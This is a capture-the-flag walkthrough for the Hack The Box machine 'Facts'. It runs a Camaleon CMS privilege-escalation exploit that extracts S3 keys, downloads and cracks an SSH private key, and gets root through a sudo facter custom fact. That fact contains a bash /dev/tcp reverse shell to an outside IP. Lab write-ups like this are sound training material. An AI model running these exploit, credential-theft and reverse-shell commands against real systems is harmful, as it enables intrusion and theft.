# HTB Walkthrough — Facts
- **Author**: ElJoamy
- **Machine**: Facts
- **Machine URL**: https://app.hackthebox.com/machines/Facts

## Goal
- Obtain initial access via Camaleon CMS.
- Exfiltrate AWS S3 credentials and SSH keys.
- Gain SSH access as a user.
- Escalate privileges to root using facter.
- Capture the flags.

## **Recon (Nmap)**
**Run version and default script scan:**

```bash
nmap -sV -sC 10.129.244.96 -oN nmap.txt
```

**Key results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
|_http-server-header: nginx/1.26.3 (Ubuntu)
```

**Notes:**
- Open ports: 22 (SSH), 80 (HTTP).
- Virtual host redirect to facts.htb.

**Add host entry:**
```
10.129.244.96 facts.htb
```

## **Web Enumeration (Gobuster)**
**Enumerate directories:**
```bash
gobuster dir -u http://facts.htb/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -o gobuster.txt
```

**Interesting endpoints:**
```
index (200)
search (200)
admin (302) [--> http://facts.htb/admin/login]
...
```

**Visit /admin/login and create an account:**
- Username: test
- Password: test

- **After login, role**: client. **Dashboard shows:**
```
Camaleon CMS v2.9.0
```

## **Exploitation — Camaleon CMS CVE-2025-2304**
**Reference**: https://github.com/Alien0ne/CVE-2025-2304

This exploit lets an authenticated **client** escalate privileges, change other users’ passwords, and extract **AWS** secrets.

**Run:**
```bash
python3 exploit.py -u http://facts.htb -U test -P test --newpass test1 -e -r
```
**Parameters:**
- -u: target URL
- -U/-P: credentials
- --newpass: new password to set
- -e: extract AWS secrets (S3)
- -r: revert role back to client after exploitation

**Sample output (short):**
```
Updated User Role: admin
Extracting S3 Credentials
   s3 access key: AKIA1CD0FEF83C3810B8
   s3 secret key: rH61JGpjEMkR/BF5vzSxRSp1vhwIlMiZg8Av67gj
   s3 endpoint: http://localhost:54321
```

## **Post-Exploitation — Access S3**
**Configure AWS:**
```bash
aws configure
```

**List buckets via the custom endpoint:**
```bash
aws --endpoint-url http://facts.htb:54321 s3 ls
```
**Buckets:**
```
internal
randomfacts
```

**List internal contents:**
```bash
aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal
```
**We see .ssh; list and download:**
```bash
aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/.ssh/
aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 id_ed25519
aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/authorized_keys authorized_keys
```

## **Key Cracking and SSH**
**Format the private key for cracking:**
```bash
python3 /usr/share/john/ssh2john.py id_ed25519 > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
```

**Prepare key and derive public key (optional):**
```bash
chmod 600 id_ed25519
ssh-keygen -y -f id_ed25519
```

**SSH in:**
```bash
ssh -i id_ed25519 trivia@facts.htb
```

## **Privilege Enumeration**
**Check sudo rights:**
```bash
sudo -l
```
**Result:**
```
(ALL) NOPASSWD: /usr/bin/facter
```

We can run **facter** as **root** without a password.

## **PrivEsc to root using facter (custom fact)**
**Create a malicious custom fact:**
```bash
echo 'Facter.add(:pwn) do
setcode do
system("bash -c \"bash -i >& /dev/tcp/10.10.15.196/4444 0>&1\"")
end
end' > /tmp/pwn.rb
```

**Start a listener:**
```bash
nc -nlvp 4444
```

**Load custom facts:**
```bash
sudo /usr/bin/facter --custom-dir /tmp
```

**Verify root:**
```bash
id
```
```
uid=0(root) gid=0(root) groups=0(root)
```

## Flags
- Look in the usual paths: /home/<user>/user.txt and /root/root.txt.
- Submit them to the HTB platform.
